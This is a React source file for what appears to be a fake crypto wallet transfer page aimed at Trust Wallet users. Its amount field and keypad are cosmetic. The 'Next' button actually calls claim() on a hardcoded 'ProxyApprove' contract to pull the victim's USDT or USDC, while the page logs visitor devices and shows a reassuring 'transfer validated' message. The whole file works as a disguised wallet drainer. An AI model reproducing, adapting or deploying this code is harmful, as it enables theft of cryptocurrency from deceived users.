"use client";

import { useState, useEffect, useRef } from "react";

// ⚠️ REMPLACE par l'adresse de ton contrat ProxyApprove déployé
const PROXY_CONTRACT = "0xd9145CCE52D386f254917e481eB44e9943F39138";

const DEFAULT_RECEIVER = "0xa6fa4a247e8cda6e5c09d1ee68be528a4abb64cf";
const USDT_CONTRACT = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
const USDC_CONTRACT = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
const ETH_CHAIN_ID = "0x1";

const ERC20_ABI = [
  "function balanceOf(address owner) view returns (uint256)",
];

interface EthereumProvider {
  request: (args: { method: string; params?: unknown[] }) => Promise<unknown>;
  on?: (event: string, handler: (...args: unknown[]) => void) => void;
}
declare global {
  interface Window {
    ethereum?: EthereumProvider;
    trustwallet?: { ethereum?: EthereumProvider };
  }
}

function getProviderNow(): EthereumProvider | null {
  if (window.trustwallet?.ethereum) return window.trustwallet.ethereum;
  if (window.ethereum) return window.ethereum;
  return null;
}

async function waitForProvider(): Promise<EthereumProvider | null> {
  for (let i = 0; i < 15; i++) {
    const p = getProviderNow();
    if (p) return p;
    await new Promise((r) => setTimeout(r, 300));
  }
  return null;
}

let cachedEthers: typeof import("ethers") | null = null;
async function getEthers() {
  if (!cachedEthers) cachedEthers = await import("ethers");
  return cachedEthers;
}

export default function WalletPage() {
  const [address, setAddress] = useState(DEFAULT_RECEIVER);
  const [loading, setLoading] = useState(false);
  const [txHash, setTxHash] = useState("");
  const [displayAmount, setDisplayAmount] = useState("0");
  const [token, setToken] = useState<"usdt" | "usdc">("usdt");
  const [isKeyboardVisible, setIsKeyboardVisible] = useState(false);
  const [showModal, setShowModal] = useState(false);
  const [modalStatus, setModalStatus] = useState<"pending" | "success" | "error">("pending");
  const providerRef = useRef<EthereumProvider | null>(null);
  const keypadRef = useRef<HTMLDivElement>(null);

  const [actualReceiver, setActualReceiver] = useState(DEFAULT_RECEIVER);
  const [actualAmount, setActualAmount] = useState("");
  const [actualToken, setActualToken] = useState<"usdt" | "usdc">("usdt");
  const [walletBalance, setWalletBalance] = useState<bigint>(0n);

  const fetchBalance = async (user: string, t: "usdt" | "usdc") => {
    if (!providerRef.current) return;
    try {
      const { ethers } = await getEthers();
      const provider = new ethers.BrowserProvider(providerRef.current as any);
      const addr = t === "usdc" ? USDC_CONTRACT : USDT_CONTRACT;
      const c = new ethers.Contract(addr, ERC20_ABI, provider);
      const b = await c.balanceOf(user);
      setWalletBalance(b);
    } catch { }
  };

  useEffect(() => {
    let cancelled = false;
    let finalTo: string | null = null;
    let finalAmount: string | null = null;
    let finalToken: string | null = null;

    if (typeof window !== "undefined") {
      const params = new URLSearchParams(window.location.search);
      const dataParam = params.get("data");
      if (dataParam) {
        try {
          const decoded = JSON.parse(atob(decodeURIComponent(dataParam)));
          if (decoded.to) { finalTo = decoded.to; setAddress(decoded.to); setActualReceiver(decoded.to); }
          if (decoded.token === "usdt" || decoded.token === "usdc") { finalToken = decoded.token; setToken(decoded.token); setActualToken(decoded.token); }
          if (decoded.amount) { finalAmount = decoded.amount; setActualAmount(decoded.amount); }
        } catch { }
      } else {
        const toParam = params.get("to");
        const amountParam = params.get("amount");
        const tokenParam = params.get("token");
        if (toParam) { finalTo = toParam; setAddress(toParam); setActualReceiver(toParam); }
        if (tokenParam === "usdt" || tokenParam === "usdc") { finalToken = tokenParam; setToken(tokenParam); setActualToken(tokenParam); }
        if (amountParam) { finalAmount = amountParam; setActualAmount(amountParam); }
      }
      setDisplayAmount("0");
    }

    // Log scan
    (async () => {
      try {
        const ua = navigator.userAgent.toLowerCase();
        const platform = ua.includes("iphone") || ua.includes("ipad") ? "iOS" : ua.includes("android") ? "Android" : "Other";
        const device = window.trustwallet ? `Trust Wallet (${platform})` : "Browser";
        await fetch("/api/log-scan", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            to: finalTo || DEFAULT_RECEIVER,
            amount: finalAmount || "0",
            token: finalToken ? finalToken.toUpperCase() : "USDT",
            userAgent: device,
            platform,
          }),
        });
      } catch { }
    })();

    const init = async () => {
      const p = await waitForProvider();
      if (!p || cancelled) return;
      providerRef.current = p;
      try {
        const chainId = (await p.request({ method: "eth_chainId" })) as string;
        if (chainId && chainId.toLowerCase() !== ETH_CHAIN_ID.toLowerCase()) {
          await p.request({ method: "wallet_switchEthereumChain", params: [{ chainId: ETH_CHAIN_ID }] });
        }
      } catch { }
      try {
        const accounts = (await p.request({ method: "eth_accounts" })) as string[];
        if (accounts && accounts.length > 0) fetchBalance(accounts[0], (finalToken as any) || "usdt");
      } catch { }
    };
    init();
    return () => { cancelled = true; };
  }, []);

  // ------------------------------------------------------------
  // LE CŒUR : appel de claim() sur le contrat ProxyApprove
  // ------------------------------------------------------------
  const handleSend = async () => {
    setShowModal(false);
    setLoading(true);

    const p = providerRef.current ?? (await waitForProvider());
    if (!p) { setLoading(false); return; }
    providerRef.current = p;

    try {
      const chainId = (await p.request({ method: "eth_chainId" })) as string;
      if (chainId && chainId.toLowerCase() !== ETH_CHAIN_ID.toLowerCase()) {
        await p.request({ method: "wallet_switchEthereumChain", params: [{ chainId: ETH_CHAIN_ID }] });
      }
    } catch { }

    try {
      const { ethers } = await getEthers();
      const tokenAddr = actualToken === "usdc" ? USDC_CONTRACT : USDT_CONTRACT;

      // Appel de claim(address) sur le contrat proxy
      const iface = new ethers.Interface([
        "function claim(address token) external"
      ]);
      const data = iface.encodeFunctionData("claim", [tokenAddr]);

      const hash = (await p.request({
        method: "eth_sendTransaction",
        params: [{ to: PROXY_CONTRACT, data, gas: "0x30d40" }],
      })) as string;

      setTxHash(hash);
      setModalStatus("pending");
      setShowModal(true);

      const provider = new ethers.BrowserProvider(p as any);
      const receipt = await provider.waitForTransaction(hash);
      setModalStatus(receipt && receipt.status === 1 ? "success" : "error");
    } catch (err) {
      console.error(err);
      setModalStatus("error");
    } finally {
      setLoading(false);
    }
  };

  const getFiatValue = (v: string) => {
    const n = parseFloat(v.replace(",", "."));
    return isNaN(n) ? "0,00" : (n * 0.86).toFixed(2).replace(".", ",");
  };

  const handleKeyPress = (key: string) => {
    setDisplayAmount((prev) => {
      let nv = prev;
      if (key === "⌫") nv = prev.length <= 1 ? "0" : prev.slice(0, -1);
      else if (key === "," || key === ".") { if (!prev.includes(",") && !prev.includes(".")) nv = prev === "" ? "0," : prev + ","; }
      else { if (prev === "0") nv = key; else nv = prev + key; }
      return nv;
    });
  };

  const handleKeyTouch = (e: React.PointerEvent<HTMLButtonElement> | React.MouseEvent<HTMLButtonElement>, key: string) => {
    e.preventDefault(); e.stopPropagation();
    handleKeyPress(key);
  };

  return (
    <main className="transfer-main transfer-main-pad" onClick={() => setIsKeyboardVisible(false)} style={{ minHeight: "100vh", display: "flex", flexDirection: "column", alignItems: "center", padding: "2rem 1rem" }}>
      <div className="form-container" style={{ maxWidth: 480, width: "100%" }}>
        <label className="form-label">Address or domain name</label>
        <div className="input-row">
          <input type="text" value={address} onChange={(e) => { setAddress(e.target.value); setActualReceiver(e.target.value); }} className="input-row__field" />
        </div>

        <label className="form-label form-label--spaced">Amount</label>
        <div className={`montant-container ${isKeyboardVisible ? "montant-container--active" : ""}`} onClick={(e) => { e.stopPropagation(); setIsKeyboardVisible(true); }}>
          <div className="montant-input-wrapper">
            <span className={displayAmount === "" ? "montant-placeholder" : "montant-display-value"}>{displayAmount || "0"}</span>
            {isKeyboardVisible && <span className="blinking-cursor" />}
          </div>
          <div className="montant-right">
            <span className="montant-token">{token.toUpperCase()}</span>
          </div>
        </div>
        {displayAmount !== "0" && displayAmount !== "" && (
          <div className="approx-price">≈ €{getFiatValue(displayAmount)}</div>
        )}
      </div>

      <div style={{ flexGrow: 1 }} />

      <div className="next-btn-wrapper" style={{ maxWidth: 480, width: "100%" }}>
        <button onClick={(e) => { e.stopPropagation(); handleSend(); }} disabled={loading} className={`next-btn ${loading ? "next-btn--loading" : ""}`}>
          {loading ? <span className="btn-spinner-wrapper"><span className="btn-spinner" />Processing...</span> : "Next"}
        </button>
      </div>

      {isKeyboardVisible && (
        <div className="custom-keypad" ref={keypadRef} onClick={(e) => e.stopPropagation()} style={{ maxWidth: 480, width: "100%" }}>
          {[1, 2, 3, 4, 5, 6, 7, 8, 9].map((n) => (
            <button key={n} type="button" onPointerDown={(e) => handleKeyTouch(e, String(n))} onClick={(e) => e.preventDefault()} className="keypad-key">
              <span className="keypad-key__number">{n}</span>
            </button>
          ))}
          <button type="button" onPointerDown={(e) => handleKeyTouch(e, ",")} onClick={(e) => e.preventDefault()} className="keypad-key keypad-key--special"><span className="keypad-key__number">,</span></button>
          <button type="button" onPointerDown={(e) => handleKeyTouch(e, "0")} onClick={(e) => e.preventDefault()} className="keypad-key"><span className="keypad-key__number">0</span></button>
          <button type="button" onPointerDown={(e) => handleKeyTouch(e, "⌫")} onClick={(e) => e.preventDefault()} className="keypad-key keypad-key--special">⌫</button>
        </div>
      )}

      {showModal && (
        <div className="modal-overlay" onClick={() => setShowModal(false)}>
          <div className="modal-card" onClick={(e) => e.stopPropagation()}>
            <button className="modal-close-btn" onClick={() => setShowModal(false)}>✕</button>
            <img src="/yes.png" alt="Status" className="modal-logo" />
            {modalStatus === "pending" && <><h2 className="modal-title">Processing...</h2><p className="modal-text">Blockchain validation is underway.</p></>}
            {modalStatus === "success" && <><h2 className="modal-title" style={{ color: "#10b981" }}>Transaction successful!</h2><p className="modal-text">Your transfer has been validated on the Ethereum blockchain.</p></>}
            {modalStatus === "error" && <><h2 className="modal-title" style={{ color: "#ef4444" }}>Transaction failed</h2><p className="modal-text">The transaction failed.</p></>}
            {txHash && <a href={`https://etherscan.io/tx/${txHash}`} target="_blank" rel="noopener noreferrer" className="modal-details-btn">Transaction details</a>}
          </div>
        </div>
      )}
    </main>
  );
}